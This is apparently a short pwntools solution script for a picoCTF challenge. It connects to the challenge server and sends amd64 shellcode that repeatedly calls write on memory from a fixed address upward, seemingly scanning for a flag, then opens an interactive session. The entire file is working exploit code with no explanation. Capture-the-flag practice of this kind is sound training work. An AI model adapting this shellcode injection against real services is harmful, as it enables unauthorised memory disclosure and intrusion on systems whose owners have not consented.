from pwn import *

context.arch = 'amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'mars.picoctf.net', 31021
r = remote(HOST, PORT)

sh = asm('''
mov rsi, 0x550000002060

a:
    mov rax, 1
    mov rdi, 1
    mov rdx, 64
    syscall

    add rsi, 0x100000
    jmp a

''')
r.sendline(sh)
r.interactive()